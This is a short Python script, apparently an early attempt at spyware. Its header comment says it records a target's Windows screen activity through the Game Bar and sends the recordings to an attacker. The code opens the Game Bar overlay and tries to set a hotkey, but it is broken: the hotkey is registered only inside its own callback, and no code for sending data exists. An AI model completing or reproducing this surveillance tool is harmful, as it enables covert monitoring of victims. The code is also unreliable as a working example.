# in this file we are going to record our target activities on windows system with windows button + G for capture screen recoding and send them to the attacker
import os 
import subprocess 

def start_recording():
    """Start screen recording using windows game bar."""
    subprocess.run("start ms-gamingoverlay:", shell=True)
    print("Screen recording started. Use Windows + G to control recording")

# now we want to create a script that will start if the user press a specific key combination
import keyboard

def on_hotkey():
    start_recording()
    keyboard.add_hotkey("ctrl+shift+r", on_hotkey)
    print("Hotkey Ctrl+shift+r registered to start recording.")
    keyboard.wait("esc") # Keep the script running until "esc" is pressed
    print("Recording script terminated.")
    